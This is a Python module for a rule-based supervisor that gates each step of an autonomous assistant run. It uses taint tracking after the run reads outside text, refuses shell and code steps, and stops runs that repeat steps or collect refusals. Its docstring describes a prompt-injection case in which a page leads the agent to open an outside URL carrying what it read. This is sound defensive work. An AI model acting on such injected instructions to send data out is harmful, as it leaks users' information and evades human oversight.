"""Every step an autonomous run takes passes through here before it runs.

The approval gate judges one action at a time, as each tool describes it, and MEDIUM runs with
no card in the web app. So a run that had read a web page could be told by that page to
`open url https://elsewhere/?q=<what it read>` and nothing asked: each step was fine alone.
The supervisor is the run's memory. It is plain rules, never a model, because a model that
judges injected text can be talked round by it:

- taint: once the run has read anything it did not write (a page, a file, mail, a note, an MCP
  reply), a step that sends somewhere the text can choose, changes the laptop or changes what is
  remembered is asked about first, even when it would otherwise run silently;
- direct only: the shell, running or rewriting code and deleting files are the user's own
  commands, never a step of a run;
- off the track: the same step a third time, or two refusals, ends the run;
- every verdict is written to the audit log with the rule that made it.

It supervises what a run asks for. What an approved program then does is the operating
system's to contain, not this module's.
"""
from __future__ import annotations

from dataclasses import dataclass
from enum import Enum


class Verdict(str, Enum):
    ALLOW = "allow"
    ASK = "ask"
    REFUSE = "refuse"   # this step is not run; the run goes on and is told why
    STOP = "stop"       # the run ends


@dataclass(frozen=True)
class Decision:
    verdict: Verdict
    rule: str = ""
    reason: str = ""


class RunStopped(Exception):
    """The supervisor ended the run. Its text is the run's answer."""


# The agent's commands by what they mean to a run, as the forms `_AGENT_COMMANDS` lists them
# (tests/test_supervisor.py holds the two together: every command is in exactly one group).
# READS: its result is text the user did not write, so it may carry instructions.
READS = (
    "read file", "ask file", "summarize file", "extract text", "extract tables", "analyze spreadsheet",
    "process file", "search files", "recall", "ask knowledge", "notes search", "ask vault", "read note",
    "web search", "news", "research", "summarize youtube", "read screen", "describe image",
    "describe video", "look at webcam", "email digest", "email api search", "solve", "briefing",
)
# GUARDED: runs with no card today, and reaches an address the text can choose, the desktop, or
# what is remembered. Asked about once the run is tainted.
GUARDED = (
    "open url", "inspect page", "save note", "remember", "forget", "knowledge prune", "index file",
    "watch news", "unwatch", "briefing set", "job add", "screenshot", "play music", "window",
)
# CARDED: its own tool already asks at HIGH or CRITICAL, so a second card would add nothing.
CARDED = (
    "download", "file move", "file copy", "file rename", "undo file", "convert file", "organize folder",
    "open app", "message", "workspace", "learn from chat", "email api draft", "email api send", "mcp",
)
# DIRECT: never a step of a run.
DIRECT = ("run command", "code run", "code fix", "file delete")
# SAFE: computed here or read from the user's own stores; neither tainting nor guarded.
SAFE = (
    "scan files", "file info", "knowledge list", "knowledge stats", "notes audit", "windows", "watch health",
    "watches", "image", "document", "weather", "translate", "distance", "trip", "around", "map",
    "hotels near", "total", "average", "count", "jobs", "tasks", "reminders due", "reminder add", "timer",
    "alarm", "timers", "alarms", "lists", "list", "calendar", "convert", "memory", "audit",
)
# A command that both reads and is in another group: a page or a server answers with its own text.
ALSO_READS = ("inspect page", "mcp")
_GROUPS = (("direct", DIRECT), ("guarded", GUARDED), ("carded", CARDED), ("reads", READS), ("safe", SAFE))
MAX_REPEATS = 2
MAX_REFUSALS = 2


def _matches(lowered: str, form: str) -> bool:
    return lowered == form or lowered.startswith(form + " ")


def group_of(command: str) -> tuple[str, str]:
    """(group, form) for a command, by its longest matching form; ("unknown", "") for none."""
    lowered = " ".join((command or "").lower().split())
    best = ("unknown", "")
    for name, forms in _GROUPS:
        for form in forms:
            if _matches(lowered, form) and len(form) > len(best[1]):
                best = (name, form)
    return best


def allowed_in_a_run(form: str) -> bool:
    """Whether an agent command form may be offered to a run at all."""
    return group_of(form.split("<", 1)[0].split("[", 1)[0])[0] != "direct"


class Supervisor:
    """One run's supervisor. `check` before each step; `refused` when a step was not approved."""

    def __init__(self) -> None:
        self.tainted_by = ""
        self._seen: dict[str, int] = {}
        self._refusals = 0

    def refused(self) -> None:
        self._refusals += 1

    def check(self, command: str) -> Decision:
        lowered = " ".join((command or "").lower().split())
        if self._refusals >= MAX_REFUSALS:
            return Decision(Verdict.STOP, "refusals", f"{self._refusals} of its steps were refused, so it is not "
                                                      "going where you want")
        self._seen[lowered] = self._seen.get(lowered, 0) + 1
        if self._seen[lowered] > MAX_REPEATS:
            return Decision(Verdict.STOP, "repeat", f"it tried the same step a third time: {command[:120]}")
        group, form = group_of(lowered)
        if group == "direct":
            self._refusals += 1
            return Decision(Verdict.REFUSE, "direct", f"\"{form}\" is never a step of an agent run. Ask for it "
                                                      "yourself, outside agent mode.")
        tainted_before = self.tainted_by
        if group == "reads" or any(_matches(lowered, form) for form in ALSO_READS):
            self.tainted_by = self.tainted_by or form or lowered[:40]
        if tainted_before and group in {"guarded", "unknown"}:
            return Decision(Verdict.ASK, "taint", f"This run has read outside text ({tainted_before}), which can "
                                                  "carry instructions, and now wants to act on the laptop or send "
                                                  "something out.")
        return Decision(Verdict.ALLOW, group)
